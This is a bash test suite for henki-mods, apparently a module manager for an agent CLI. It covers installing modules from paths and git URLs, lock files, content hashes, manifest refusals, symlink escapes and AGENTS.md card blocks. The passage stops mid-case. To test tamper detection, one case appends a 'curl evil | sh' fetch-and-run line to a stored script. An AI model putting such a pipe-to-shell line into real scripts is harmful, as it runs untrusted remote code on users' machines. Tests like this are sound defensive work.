#!/usr/bin/env bash
# The tests of henki-mods. Hermetic: every case gets its own HOME, XDG dirs and TMPDIR under one scratch dir, git
# fixtures are repositories this script makes (cloned through file:// URLs), and nothing touches the network or the
# user's config. Bash 3.2 compatible like the manager, so it runs on a stock Mac too.
#
#   manager/tests.sh                    every case, once with bash and once with bash --posix
#   MODS_TEST_HENKI=PATH manager/tests.sh
#       also checks the prompt bytes `list` reports against a real `henki run --json` request, sent to a small
#       python3 stub that records the system prompt (check.sh passes the henki it built)
#
# Exit 0 when every case passes; each failure prints the case, the check and the manager's output.
set -u
export LC_ALL=C
cd "$(dirname "$0")" || exit 1
HERE=$(pwd -P)
MODS="$HERE/henki-mods"
HENKI_BIN=${MODS_TEST_HENKI:-}
unset MODS_TEST_HENKI HENKI_SHARE HENKI_MODS_TTY GIT_DIR GIT_WORK_TREE
export GIT_CONFIG_NOSYSTEM=1 GIT_AUTHOR_NAME=fixture GIT_AUTHOR_EMAIL=fixture@example.invalid
export GIT_COMMITTER_NAME=fixture GIT_COMMITTER_EMAIL=fixture@example.invalid
SCRATCH=$(mktemp -d "${TMPDIR:-/tmp}/henki-mods-tests.XXXXXX") || exit 1
trap 'chmod -R u+w "$SCRATCH" 2>/dev/null; rm -rf "$SCRATCH"' EXIT
tab=$(printf '\t')
nl='
'
FAILS=0
CASES=0
RUN=bash # the interpreter the manager runs under: bash, then bash --posix

if command -v sha256sum >/dev/null 2>&1; then sha() { sha256sum | awk '{ print $1 }'; }; else sha() { shasum -a 256 | awk '{ print $1 }'; }; fi

# --- the harness -------------------------------------------------------------------------------------------------------

# A case: a fresh HOME (its config dir empty), XDG dirs that are not the defaults, and a work dir W for fixtures.
# XDG_CONFIG_HOME points elsewhere on purpose: henki reads ~/.config/henki, so the manager must too.
case_() {
  CASE="$1"
  CASES=$((CASES + 1))
  local d="$SCRATCH/$CASES"
  mkdir -p "$d/home" "$d/w" "$d/tmp"
  export HOME="$d/home" XDG_DATA_HOME="$d/data" XDG_CONFIG_HOME="$d/xdg-config" TMPDIR="$d/tmp"
  W="$d/w"
  CONF="$HOME/.config/henki"
  STORE="$XDG_DATA_HOME/henki/mods"
  unset HENKI_SHARE HENKI_MODS_TTY
}

# Runs the manager; OUT, ERR, RC.
run() {
  RC=0
  OUT=$($RUN "$MODS" "$@" 2>"$SCRATCH/err") || RC=$?
  ERR=$(cat "$SCRATCH/err")
}

fail() {
  FAILS=$((FAILS + 1))
  printf 'FAIL [%s] %s: %s\n  rc=%s\n  out: %s\n  err: %s\n' "$RUN" "$CASE" "$*" "${RC:-}" "${OUT:-}" "${ERR:-}" | sed '4,$s/^/       /' >&2
}
rc_is() { [ "$RC" = "$1" ] || fail "exit $RC, wanted $1"; }
out_has() { case "$OUT" in *"$1"*) ;; *) fail "stdout lacks: $1" ;; esac; }
err_has() { case "$ERR" in *"$1"*) ;; *) fail "stderr lacks: $1" ;; esac; }
out_lacks() { case "$OUT" in *"$1"*) fail "stdout has: $1" ;; esac; }
err_lacks() { case "$ERR" in *"$1"*) fail "stderr has: $1" ;; esac; }
check() { # DESCRIPTION COMMAND...
  local what="$1"
  shift
  "$@" || fail "$what"
}
# A refusal: exit 1, henki's "henki-mods: PROBLEM; fix: ..." form, and TEXT in it.
refused() {
  rc_is 1
  err_has "$1"
  case "${ERR##*"$nl"}" in "henki-mods: "*"; fix: "*) ;; *) fail "the last line is not a 'henki-mods: PROBLEM; fix: ...' message" ;; esac
}

# A module DIR named by its basename: doc.md (line 1 SUMMARY), bin/NAME (755), a manifest (plus EXTRA lines).
mkmod() {
  local dir="$1" n="${1##*/}" extra="${2:-}"
  mkdir -p "$dir/bin" "$dir/.henki"
  printf '# %s: says hello for tests\n\nThe body is read on demand.\n' "$n" >"$dir/doc.md"
  printf '#!/bin/sh\necho %s\n' "$n" >"$dir/bin/$n"
  chmod 755 "$dir/bin/$n"
  printf 'henki_module = 1\nname = "%s"\nversion = "0.1.0"\nlicense = "0BSD"\ncaps_net = "none"\n%b' "$n" "$extra" >"$dir/.henki/module.toml"
}

# A git repository at DIR from what is already in it; one commit.
mkrepo() {
  git -C "$1" init -q 2>/dev/null || git init -q "$1"
  commit "$1" "first"
}
commit() {
  git -C "$1" add -A 2>/dev/null && git -C "$1" -c commit.gpgsign=false -c core.hooksPath=/dev/null commit -q --no-verify -m "$2" 2>/dev/null
}

num() { printf '%s\n' "$1" | awk '{ s = $0; o = ""; while (length(s) > 3) { o = "," substr(s, length(s) - 2) o; s = substr(s, 1, length(s) - 3) } print s o }'; }
lockline() { awk -F '\t' -v n="$1" '$2 == n' "$CONF/mods.lock" 2>/dev/null; }
field() { lockline "$1" | cut -f "$2"; }

# --- the static check ---------------------------------------------------------------------------------------------------

# Bash 4+ only syntax, which a stock Mac's bash 3.2 does not run (there is no bash 3.2 here to run it under).
static_bash32() {
  case_ "static: no bash 4+ features"
  local f hits
  for f in "$MODS" "$HERE/tests.sh"; do
    hits=$(command grep -nE '(^|[^[:alnum:]_])(mapfile|readarray|coproc)([^[:alnum:]_]|$)|(declare|local|typeset) +-[a-zA-Z]*[An]|\$\{[[:alnum:]_]+(,,?|\^\^?)[}[:alnum:]]|\$\{[[:alnum:]_]+@[QEPAa]\}|\|&|&>>|;;&|\[\[ +-v |\$\{[[:alnum:]_]+\[-[0-9]|EPOCH(SECONDS|REALTIME)|BASHPID|wait +-n|shopt +-s +(globstar|lastpipe|inherit_errexit)|\{[0-9]+\.\.[0-9]+\.\.' "$f" |
      command grep -vE '^[0-9]+:[[:space:]]*#|command grep -nE' || true)
    [ -z "$hits" ] || fail "$f uses bash 4+ syntax:$(printf '\n%s' "$hits")"
  done
  # GNU-only flags and tools, which a Mac lacks.
  for f in "$MODS" "$HERE/tests.sh"; do
    hits=$(command grep -nE '(^|[^[:alnum:]_-])(sed -i|readlink -f|stat -c|grep -P|date -d|mv -T|cp -T|sort -V|realpath|tac|xargs -r)([^[:alnum:]_-]|$)|-printf' "$f" |
      command grep -vE '^[0-9]+:[[:space:]]*#|command grep -nE' || true)
    [ -z "$hits" ] || fail "$f uses a GNU-only tool or flag:$(printf '\n%s' "$hits")"
  done
  # Arrays: an empty one is "unbound" under set -u before bash 4.4, so the manager has none.
  hits=$(command grep -nE '^[^#]*([[:alnum:]_]+=\(|\$\{[[:alnum:]_]+\[)' "$MODS" || true)
  [ -z "$hits" ] || fail "henki-mods uses an array:$(printf '\n%s' "$hits")"
  bash -n "$MODS" || fail "bash -n henki-mods"
}

# --- the cases ----------------------------------------------------------------------------------------------------------

t_add_path() {
  case_ "add from a path, --yes"
  mkmod "$W/hello"
  run add "$W/hello" --yes
  rc_is 0
  out_has "hello 0.1.0"
  out_has "license  0BSD"
  out_has "network  none (declared, NOT enforced)"
  out_has "bin/hello (sh, 2 lines)"
  out_has "restart henki (or /exit and start again) to load the change"
  out_lacks "UNREVIEWED"
  local l hd store
  l=$(lockline hello)
  hd=$(field hello 8)
  store="$STORE/hello/$(printf '%s' "${hd#hd1:}" | cut -c1-12)"
  check "11 tab-separated fields, MASK empty" [ "$(printf '%s' "$l" | awk -F '\t' '{ print NF ":" $11 }')" = "11:" ]
  check "lock/1 hello on 0.1.0 path SOURCE - " [ "$(printf '%s' "$l" | cut -f 1-7)" = "lock/1${tab}hello${tab}on${tab}0.1.0${tab}path${tab}$W/hello${tab}-" ]
  check "ADDED is UTC minutes" sh -c "printf '%s' '$(field hello 9)' | command grep -qE '^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}Z$'"
  check "HOW is yes" [ "$(field hello 10)" = yes ]
  check "the link points at the store copy" [ "$(readlink "$CONF/ext/hello")" = "$store" ]
  check "no file under XDG_CONFIG_HOME" [ ! -e "$XDG_CONFIG_HOME" ]
  check "store files are read-only" [ -z "$(find "$store" ! -type l -perm -200 -print)" ]
  check "store dirs are read-only" [ ! -w "$store/bin" ] || [ "$(id -u)" = 0 ]
  check "no scratch dir left in the store" [ -z "$(find "$STORE" -name '.add.*' -print)" ]
  check "no busy dir left" [ ! -e "$CONF/mods.busy" ]
  run verify
  rc_is 0
  out_has "verify: ok (1 modules)"
  # A path with #SUBDIR, and the same module twice.
  case_ "add DIR#SUBDIR from a path"
  mkmod "$W/repo/mods/hi"
  run add "$W/repo#mods/hi" --yes
  rc_is 0
  check "lock names the dir" [ "$(field hi 6)" = "$W/repo/mods/hi" ]
  run add "$W/repo/mods/hi" --yes
  refused "hi is already added"
}

t_ask() {
  case_ "add asks on the terminal, default no"
  mkmod "$W/hello"
  printf '\n' >"$W/answer"
  HENKI_MODS_TTY="$W/answer" run add "$W/hello"
  refused "not installed (the answer was no)"
  out_has "hello 0.1.0"
  check "nothing linked" [ ! -e "$CONF/ext/hello" ]
  check "no lock line" [ -z "$(lockline hello)" ]
  check "no store copy" [ -z "$(find "$STORE" -mindepth 1 -maxdepth 1 ! -name '.*' -print 2>/dev/null)" ]
  printf 'y\n' >"$W/answer"
  HENKI_MODS_TTY="$W/answer" run add "$W/hello"
  rc_is 0
  check "HOW is tty" [ "$(field hello 10)" = tty ]
  check "on" [ "$(field hello 3)" = on ] && [ -L "$CONF/ext/hello" ]
  case_ "add without a terminal and without --yes"
  mkmod "$W/hello"
  HENKI_MODS_TTY="$W/none" run add "$W/hello"
  refused "no terminal to ask on"
  check "nothing linked" [ ! -e "$CONF/ext/hello" ]
}

t_git() {
  case_ "add from a git URL with @REF and #SUBDIR"
  local r="$W/repo" c1 c2 store
  mkmod "$r/mods/hello"
  printf 'first\n' >"$r/README.md"
  mkrepo "$r"
  git -C "$r" tag v1
  c1=$(git -C "$r" rev-parse HEAD)
  printf '# hello: version two\n' >"$r/mods/hello/doc.md"
  commit "$r" second
  git -C "$r" branch feature/x
  c2=$(git -C "$r" rev-parse HEAD)
  run add "file://$r@v1#mods/hello" --yes
  rc_is 0
  out_has "UNREVIEWED"
  out_has "commit $c1"
  check "SOURCE is URL#SUBDIR" [ "$(field hello 6)" = "file://$r#mods/hello" ]
  check "COMMIT is the tag's commit" [ "$(field hello 7)" = "$c1" ]
  check "KIND url" [ "$(field hello 5)" = url ]
  store="$STORE/hello/$(printf '%s' "$c1" | cut -c1-12)"
  check "store ID is the commit's first 12 hex" [ "$(readlink "$CONF/ext/hello")" = "$store" ]
  check "the copy is the tagged content" command grep -q 'says hello for tests' "$store/doc.md"
  check "nothing outside SUBDIR" [ ! -e "$store/README.md" ] && [ ! -e "$store/mods" ]
  run rm hello
  rc_is 0
  run add "file://$r#mods/hello" --yes
  rc_is 0
  check "no REF: the default branch" [ "$(field hello 7)" = "$c2" ]
  run rm hello
  run add "file://$r@feature/x#mods/hello/" --yes
  rc_is 0
  check "a branch with a slash" [ "$(field hello 7)" = "$c2" ]
  run rm hello
  run add "file://$r@$(printf '%s' "$c1" | cut -c1-10)#mods/hello" --yes
  rc_is 0
  check "a short commit" [ "$(field hello 7)" = "$c1" ]
  run rm hello
  run add "file://$r@nope#mods/hello" --yes
  refused "has no nope to pin"
  run add "file://$r@v1#mods/absent" --yes
  refused "has no directory mods/absent"
  run add "file://$W/no-such-repo" --yes
  refused "git clone"
  # A whole repository is one module; its name comes from the URL.
  case_ "add a whole repository by URL"
  mkdir -p "$W/henki-tool.git"
  mkmod "$W/henki-tool.git/tool"
  mv "$W/henki-tool.git/tool/"* "$W/henki-tool.git/tool/.henki" "$W/henki-tool.git/"
  rmdir "$W/henki-tool.git/tool"
  mv "$W/henki-tool.git/bin/tool" "$W/henki-tool.git/bin/henki-tool"
  sed 's/^name = .*//' "$W/henki-tool.git/.henki/module.toml" >"$W/m" && mv "$W/m" "$W/henki-tool.git/.henki/module.toml"
  mkrepo "$W/henki-tool.git"
  run add "file://$W/henki-tool.git" --yes
  refused "no name"
  rm -rf "$W/henki-tool.git/.henki"
  commit "$W/henki-tool.git" "drop the manifest"
  run add "file://$W/henki-tool.git" --yes
  rc_is 0
  out_has "manifest none (unmanaged"
  check "unmanaged name from the URL, .git dropped" [ -L "$CONF/ext/henki-tool" ]
  check "VERSION -" [ "$(field henki-tool 4)" = - ]
  run list
  out_has "(unmanaged)"
}

t_raw_blobs() {
  case_ "the copy is the raw blobs: 755 kept, links kept, no filters"
  local r="$W/repo" s
  mkmod "$r/tool"
  ln -s tool "$r/tool/bin/tool-alias"
  ln -s ../doc.md "$r/tool/bin/.doc-link"
  printf 'plain\n' >"$r/tool/README.notes"
  chmod 644 "$r/tool/README.notes"
  mkrepo "$r"
  # A clean filter in the user's git config must not touch the copy (no checkout runs it).
  git config --global filter.evil.clean 'echo FILTERED' 2>/dev/null || true
  run add "file://$r#tool" --yes
  rc_is 0
  s=$(readlink "$CONF/ext/tool")
  check "bin/tool keeps its x bit" [ -n "$(find "$s/bin/tool" -perm -100 -print)" ]
  check "README.notes has no x bit" [ -z "$(find "$s/README.notes" -perm -100 -print)" ]
  check "bin/tool-alias is a link to tool" [ -L "$s/bin/tool-alias" ] && [ "$(readlink "$s/bin/tool-alias")" = tool ]
  check "the dot link is kept" [ "$(readlink "$s/bin/.doc-link")" = ../doc.md ]
  check "the blob bytes" [ "$(cat "$s/bin/tool")" = "$(printf '#!/bin/sh\necho tool')" ]
  check "hd1 in the lock is the store's" [ "$(field tool 8)" = "$(hd1_by_hand "$s")" ]
  out_has "files    6 (2 links)"
}

# hd1 the slow way, for comparison: a find, a sort, one sha per entry, by the definition.
hd1_by_hand() {
  local d="$1" p mode h
  (cd "$d" && find . -path ./.git -prune -o \( -type f -o -type l \) -print) | sed 's|^\./||' | sort | while IFS= read -r p; do
    if [ -L "$d/$p" ]; then
      mode=link
      h=$(printf '%s' "$(readlink "$d/$p")" | sha)
    else
      if [ -n "$(find "$d/$p" \( -perm -100 -o -perm -010 -o -perm -001 \) -print)" ]; then mode=755; else mode=644; fi
      h=$(sha <"$d/$p")
    fi
    printf '%s %s %s\n' "$mode" "$h" "$p"
  done | sha | sed 's/^/hd1:/'
}

t_hd1() {
  case_ "hd1 known answer"
  local m="$W/kat"
  mkdir -p "$m/bin" "$m/.henki"
  printf 'doc line\n' >"$m/doc.md"
  printf '#!/bin/sh\n' >"$m/bin/run"
  chmod 750 "$m/bin/run"
  printf 'henki_module = 1\nname = "kat"\nversion = "1"\nlicense = "MIT"\n' >"$m/.henki/module.toml"
  ln -s doc.md "$m/README.md"
  mkdir -p "$m/.git" && printf 'excluded\n' >"$m/.git/HEAD"
  # By the definition, sorted bytewise by hand: ".henki/..." < "README.md" < "bin/run" < "doc.md".
  local want
  want="hd1:$(
    printf '644 %s .henki/module.toml\n' "$(printf 'henki_module = 1\nname = "kat"\nversion = "1"\nlicense = "MIT"\n' | sha)"
    printf 'link %s README.md\n' "$(printf 'doc.md' | sha)"
    printf '755 %s bin/run\n' "$(printf '#!/bin/sh\n' | sha)"
    printf '644 %s doc.md\n' "$(printf 'doc line\n' | sha)"
  )"
  want="hd1:$(printf '%s\n' "${want#hd1:}" | sha)"
  run verify --dir "$m"
  rc_is 0
  out_has "$want"
  run add "$m" --yes
  rc_is 0
  check "the lock has the known answer" [ "$(field kat 8)" = "$want" ]
  check "store ID is the hd1's first 12 hex" [ "$(readlink "$CONF/ext/kat")" = "$STORE/kat/$(printf '%s' "${want#hd1:}" | cut -c1-12)" ]
  check "the hand-rolled hash agrees" [ "$(hd1_by_hand "$(readlink "$CONF/ext/kat")")" = "$want" ]
}

t_refusals() {
  case_ "refusals"
  local m="$W/m"
  mkmod "$W/Bad"
  sed 's/^name = .*/name = "Bad_Name"/' "$W/Bad/.henki/module.toml" >"$W/t" && mv "$W/t" "$W/Bad/.henki/module.toml"
  run add "$W/Bad" --yes
  refused "name: a name is 1 to 32 of a-z"
  rm -rf "$W/Bad/.henki"
  run add "$W/Bad" --yes
  refused "the name \"Bad\""

  mkmod "$m" 'colour = "red"\n'
  run add "$m" --yes
  refused "unknown key colour"
  run verify --dir "$m"
  refused "unknown key colour"

  rm -rf "$m" && mkmod "$m" 'os = ["plan9"]\n'
  run add "$m" --yes
  refused 'os "plan9" is not macos or linux'
  local other=linux
  [ "$(uname -s)" != Linux ] || other=macos
  rm -rf "$m" && mkmod "$m" "os = [\"$other\"]\n"
  run add "$m" --yes
  refused "runs on $other only"
  run verify --dir "$m"
  rc_is 0

  rm -rf "$m" && mkmod "$m" 'henki_module = 2\nrequires = ["henki >= 0.2"]\n'
  sed '1d' "$m/.henki/module.toml" >"$W/t" && mv "$W/t" "$m/.henki/module.toml"
  mkdir -p "$m/cmd"
  run add "$m" --yes
  refused "henki_module = 2 needs henki >= 0.2"

  rm -rf "$m" && mkmod "$m"
  mkdir -p "$m/cmd" && printf '#!/bin/sh\n' >"$m/cmd/go"
  run add "$m" --yes
  refused "cmd/: a later module layout"
  rm -rf "$m/cmd" && mkdir "$m/lib" && printf 'x\n' >"$m/lib/x"
  run add "$m" --yes
  refused "lib: unknown entry"

  rm -rf "$m" && mkmod "$m"
  ln -s ../../outside "$m/bin/escape"
  run add "$m" --yes
  refused "leaves the module"
  rm "$m/bin/escape" && ln -s /bin/sh "$m/bin/escape"
  run add "$m" --yes
  refused "is absolute or leaves the module"
  rm "$m/bin/escape" && ln -s ../bin/../../m/doc.md "$m/README.x"
  run add "$m" --yes
  refused "leaves the module"
  rm "$m/README.x"

  printf 'not runnable\n' >"$m/bin/data"
  run add "$m" --yes
  refused "a command is a file you can run"
  rm "$m/bin/data"
  rm "$m/doc.md"
  run add "$m" --yes
  refused "no doc.md"
  printf '#\n' >"$m/doc.md"
  run add "$m" --yes
  refused "line 1 must be a summary of 1 to 160 bytes"
  awk 'BEGIN { for (i = 0; i < 161; i++) printf "x"; print "" }' >"$m/doc.md"
  run add "$m" --yes
  refused "line 1 must be a summary"
  if command -v iconv >/dev/null 2>&1; then
    printf 'zero\342\200\213width\n' >"$m/doc.md"
    run add "$m" --yes
    refused "holds U+200B"
  fi
  printf 'ok\n' >"$m/doc.md"

  rm -rf "$m" && mkmod "$m"
  mkdir "$m/empty"
  run verify --dir "$m"
  refused "empty: unknown entry"
  rmdir "$m/empty" && mkdir "$m/bin/sub"
  run verify --dir "$m"
  refused "bin/sub: a directory"
  rmdir "$m/bin/sub"
  mv "$m/.henki/module.toml" "$m/manifest" && ln -s ../manifest "$m/.henki/module.toml"
  run verify --dir "$m"
  refused "module.toml: not a regular file"

  rm -rf "$m" && mkmod "$m" 'ports = ["history"]\n'
  run add "$m" --yes
  refused "ports must be empty"
  rm -rf "$m" && mkmod "$m" 'contracts = ["ext/1", "port/1"]\n'
  run add "$m" --yes
  refused "contract port/1 is not one this henki ships"
  rm -rf "$m" && mkmod "$m" 'caps_net = "lots"\n'
  sed '/^caps_net = "none"/d' "$m/.henki/module.toml" >"$W/t" && mv "$W/t" "$m/.henki/module.toml"
  run add "$m" --yes
  refused 'caps_net "lots"'
  rm -rf "$m" && mkmod "$m" 'license = "MIT"\n'
  run add "$m" --yes
  refused "duplicate key license"
  rm -rf "$m" && mkmod "$m" 'summary = "a \\"quote\\""\n'
  run add "$m" --yes
  refused "escape"
  rm -rf "$m" && mkmod "$m" 'shadow = ["nope"]\n'
  run add "$m" --yes
  refused "a shadow entry is not EXT/COMMAND"
  rm -rf "$m" && mkmod "$m" 'requires = ["itse >= 1"]\n'
  run add "$m" --yes
  refused 'requires "itse >= 1" is not "henki >= VERSION"'
  rm -rf "$m" && mkmod "$m"
  printf 'x\n' >"$m/.henki/notes"
  run add "$m" --yes
  refused ".henki holds module.toml and card.md"

  # Nothing of a refused add stays behind.
  check "no link after refusals" [ ! -e "$CONF/ext" ] || [ -z "$(ls "$CONF/ext")" ]
  check "no lock after refusals" [ ! -e "$CONF/mods.lock" ]
  check "no store copy after refusals" [ -z "$(find "$STORE" -mindepth 1 -maxdepth 1 -print 2>/dev/null)" ]

  # A dir in ext/ that henki-mods did not make.
  rm -rf "$m" && mkmod "$m"
  mkdir -p "$CONF/ext/m"
  run add "$m" --yes
  refused "exists and henki-mods did not make it"
  rmdir "$CONF/ext/m"

  # Usage errors exit 2.
  run frobnicate
  rc_is 2
  run on
  rc_is 2
  run add
  rc_is 2
  run add "$m" --force
  rc_is 2
  run on nothing-here
  refused "nothing-here is not added"
}

t_gitattributes() {
  case_ "refuse .gitattributes export-subst (and kin)"
  local r="$W/repo" a
  mkmod "$r/tool"
  printf '* -diff\n' >"$r/.gitattributes"
  printf 'doc.md export-subst\n' >"$r/tool/.gitattributes"
  mkrepo "$r"
  run add "file://$r#tool" --yes
  refused "tool/.gitattributes sets export-subst"
  check "nothing installed" [ ! -e "$CONF/mods.lock" ]
  for a in 'bin/* filter=lfs' '*.md text eol=lf' '# export-subst only in a comment' 'tool/x ident' '[attr]mine export-ignore'; do
    printf '%s\n' "$a" >"$r/tool/.gitattributes"
    commit "$r" "attrs: $a"
    run add "file://$r#tool" --yes
    case "$a" in
      '#'*) rc_is 0 && run rm tool ;;
      *) refused "sets export-subst, export-ignore, ident, filter, text or eol" ;;
    esac
  done
  # Attributes of a directory above the module apply to it.
  printf '\n' >"$r/tool/.gitattributes"
  printf 'tool/doc.md export-subst\n' >"$r/.gitattributes"
  commit "$r" "root attrs"
  run add "file://$r#tool" --yes
  refused ".gitattributes sets export-subst"
}

t_lock_newer() {
  case_ "a newer lock is refused"
  mkdir -p "$CONF"
  printf 'lock/2\tx\ton\n' >"$CONF/mods.lock"
  local v
  for v in list lock verify "on x" "off x" "rm x"; do
    # shellcheck disable=SC2086 # the verb and its argument
    run $v
    refused "this lock is newer than this henki-mods; fix: upgrade henki"
  done
  mkmod "$W/hello"
  run add "$W/hello" --yes
  refused "this lock is newer"
  check "the lock is untouched" [ "$(cat "$CONF/mods.lock")" = "$(printf 'lock/2\tx\ton')" ]
  printf 'lock/1\tx\ton\n' >"$CONF/mods.lock"
  run list
  refused "not a lock/1 line"
}

t_onoff() {
  case_ "on, off, rm flip links and lock lines"
  mkmod "$W/hello"
  mkmod "$W/bye"
  run add "$W/hello" --yes
  run add "$W/bye" --yes
  local store
  store=$(readlink "$CONF/ext/hello")
  check "the lock is sorted by name" [ "$(cut -f2 "$CONF/mods.lock" | tr '\n' ' ')" = "bye hello " ]
  run off hello
  rc_is 0
  out_has "restart henki"
  check "off: no link" [ ! -e "$CONF/ext/hello" ] && [ ! -L "$CONF/ext/hello" ]
  check "off: STATE off" [ "$(field hello 3)" = off ]
  check "off: the rest of the line kept" [ "$(field hello 8)" != "" ] && [ "$(field hello 7)" = - ]
  check "off: store kept" [ -d "$store" ]
  run off hello
  rc_is 0
  out_has "already off"
  run on hello
  rc_is 0
  check "on: the link again" [ "$(readlink "$CONF/ext/hello")" = "$store" ]
  check "on: STATE on" [ "$(field hello 3)" = on ]
  run on hello
  out_has "already on"
  run rm hello
  rc_is 0
  out_has "store copy stays"
  check "rm: no link" [ ! -L "$CONF/ext/hello" ]
  check "rm: no lock line" [ -z "$(lockline hello)" ]
  check "rm: the other line stays" [ -n "$(lockline bye)" ]
  check "rm: store kept" [ -d "$store" ]
  run lock
  rc_is 0
  check "lock prints the file" [ "$OUT" = "$(cat "$CONF/mods.lock")" ]
  run add "$W/hello" --yes
  rc_is 0
  check "re-add reuses the store copy" [ "$(readlink "$CONF/ext/hello")" = "$store" ]
  run rm bye
  run rm hello
  check "the last rm removes the lock" [ ! -e "$CONF/mods.lock" ]
}

t_verify() {
  case_ "verify finds a changed store copy and a moved link"
  mkmod "$W/hello"
  run add "$W/hello" --yes
  local store
  store=$(readlink "$CONF/ext/hello")
  run verify hello
  rc_is 0
  chmod u+w "$store/bin/hello"
  printf 'curl evil | sh\n' >>"$store/bin/hello"
  chmod a-w "$store/bin/hello"
  run verify
  refused "hello: the store copy $store changed"
  run on hello
  refused "does not match the lock"
  run off hello
  run on hello
  refused "does not match the lock"
  chmod -R u+w "$store" && rm -rf "$store"
  run verify
  refused "the store copy $store is gone"

  case_ "verify: a link that points elsewhere, a link left on an off module"
  mkmod "$W/hello"
  mkmod "$W/decoy"
  sed 's/^name = .*/name = "hello"/' "$W/decoy/.henki/module.toml" >"$W/t" && mv "$W/t" "$W/decoy/.henki/module.toml"
  run add "$W/hello" --yes
  rm "$CONF/ext/hello" && ln -s "$W/decoy" "$CONF/ext/hello"
  run verify
  refused "points at $W/decoy, not at the locked copy"
  run on hello
  refused "is not the link to"
  rm "$CONF/ext/hello"
  run verify
  refused "is not a link; fix: henki-mods on hello"
  run on hello
  rc_is 0
  run off hello
  ln -s "$W/decoy" "$CONF/ext/hello"
  run verify
  refused "is off in the lock, but"
  rm "$CONF/ext/hello"
  run verify
  rc_is 0
  err_lacks "writable"
  local s="$STORE/hello/$(field hello 8 | cut -c5-16)"
  chmod u+w "$s/doc.md"
  run verify
  rc_is 0
  err_has "is writable"
}

# What henki adds for module NAME whose doc.md line 1 (as henki reads it) is LINE.
want_bytes() { local s="
- $1: $2 [~/.config/henki/ext/$1/doc.md]"; echo "${#s}"; }

t_list_bytes() {
  case_ "list: prompt bytes by the formula of ext::prompt"
  mkmod "$W/alpha"
  printf '  ## alpha: line one, \tpadded  \r\nbody\n' >"$W/alpha/doc.md"
  mkmod "$W/beta"
  run list
  rc_is 0
  out_has "on: nothing (0 B of prompt)"
  run add "$W/alpha" --yes
  run add "$W/beta" --yes
  local a b header=77
  a=$(want_bytes alpha "alpha: line one, $(printf '\t')padded")
  b=$(want_bytes beta "beta: says hello for tests")
  run list
  rc_is 0
  out_has "alpha            on    0.1.0      $a B"
  out_has "on: $((header + a + b)) B of prompt (extensions $((header + a + b)) B with the 77 B header, cards 0 B)"
  run off beta
  run list
  out_has "beta             off   0.1.0      $b B"
  out_has "on: $((header + a)) B of prompt"
  # A hand-made extension in the ext dir counts too: henki loads it.
  mkdir -p "$CONF/ext/manual"
  printf 'manual one\n' >"$CONF/ext/manual/doc.md"
  run list
  out_has "manual           on    -          $(want_bytes manual 'manual one') B  not added by henki-mods"
  out_has "on: $((header + a + $(want_bytes manual 'manual one'))) B of prompt"
  # The screen of the next add says what it adds and the total after.
  run on beta
  rm -rf "$CONF/ext/manual"
  mkmod "$W/gamma"
  run add "$W/gamma" --yes
  out_has "prompt   +$(want_bytes gamma 'gamma: says hello for tests') B on every request (total on after: $((header + a + b + $(want_bytes gamma 'gamma: says hello for tests'))) B)"
}

t_cards() {
  case_ "cards: the block in AGENTS.md"
  mkdir -p "$CONF"
  printf '# my rules\n\nBe brief.\n' >"$CONF/AGENTS.md"
  cp "$CONF/AGENTS.md" "$W/original"
  mkmod "$W/one"
  printf 'Card one.\n' >"$W/one/.henki/card.md"
  mkmod "$W/two"
  printf 'Card two, no newline' >"$W/two/.henki/card.md"
  mkmod "$W/plain"
  run add "$W/two" --yes
  rc_is 0
  out_has "card     +20 B"
  run add "$W/one" --yes
  run add "$W/plain" --yes
  check "the block after the user's text" [ "$(cat "$CONF/AGENTS.md")" = "$(printf '# my rules\n\nBe brief.\n\n# >>> mods cards\nCard one.\n\nCard two, no newline\n# <<< mods cards')" ]
  run list
  out_has "card 10 B"
  local with=$(($(printf '# my rules\n\nBe brief.\n\n# >>> mods cards\nCard one.\n\nCard two, no newline\n# <<< mods cards' | wc -c)))
  local without=$(($(printf '# my rules\n\nBe brief.' | wc -c)))
  out_has "cards $((with - without)) B)"
  run off one
  check "off removes its card" [ "$(cat "$CONF/AGENTS.md")" = "$(printf '# my rules\n\nBe brief.\n\n# >>> mods cards\nCard two, no newline\n# <<< mods cards')" ]
  run verify
  rc_is 0
  # A block edited by hand is found, and the next change writes it again.
  printf 'extra\n' >>"$CONF/AGENTS.md"
  sed 's/^Card two, no newline$/Card two, edited/' "$CONF/AGENTS.md" >"$W/t" && cat "$W/t" >"$CONF/AGENTS.md"
  run verify
  refused "is not the cards of the modules on"
  run on one
  run verify
  rc_is 0
  check "text after the block stays" [ "$(tail -n 1 "$CONF/AGENTS.md")" = extra ]
  printf '# my rules\n\nBe brief.\n\n# >>> mods cards\nCard one.\n\nCard two, no newline\n# <<< mods cards\n' >"$CONF/AGENTS.md"
  run rm one
  run rm two
  check "the user's file comes back byte for byte" cmp -s "$CONF/AGENTS.md" "$W/original"

  case_ "cards: an AGENTS.md made only for cards goes with the last card"
  mkmod "$W/one"
  printf 'Card one.\n' >"$W/one/.henki/card.md"
  run add "$W/one" --yes
  check "AGENTS.md is the block" [ "$(cat "$CONF/AGENTS.md")" = "$(printf '# >>> mods cards\nCard one.\n# <<< mods cards')" ]
  run off one
  check "and goes" [ ! -e "$CONF/AGENTS.md" ]

  case_ "cards: the 4 KiB limit"
  mkmod "$W/big"
  awk 'BEGIN { for (i = 0; i < 4097; i++) printf "x" }' >"$W/big/.henki/card.md"
  run add "$W/big" --yes
  refused "4,097 bytes, over henki's AGENTS.md limit of 4,096"
  mkdir -p "$CONF"
  awk 'BEGIN { for (i = 0; i < 40; i++) { for (j = 0; j < 99; j++) printf "y"; print "" } }' >"$CONF/AGENTS.md"
  awk 'BEGIN { for (i = 0; i < 99; i++) printf "z"; print "" }' >"$W/big/.henki/card.md"
  run add "$W/big" --yes
  refused "the cards would make ~/.config/henki/AGENTS.md 4,135 bytes, over henki's limit of 4,096"
  check "AGENTS.md untouched" [ "$(wc -c <"$CONF/AGENTS.md" | tr -d ' ')" = 4000 ]
  check "nothing installed" [ ! -e "$CONF/mods.lock" ]
  printf 'zzz\n' >"$W/big/.henki/card.md"
  run add "$W/big" --yes
  rc_is 0
  check "under the limit is fine" [ "$(wc -c <"$CONF/AGENTS.md" | tr -d ' ')" = 4039 ]
  run verify
  rc_is 0
  printf '# >>> mods cards\n' >>"$CONF/AGENTS.md"
  run off big
  refused "a second mods cards block"
  mkmod "$W/bad"
  printf 'one\n# <<< mods cards\n' >"$W/bad/.henki/card.md"
  run verify --dir "$W/bad"
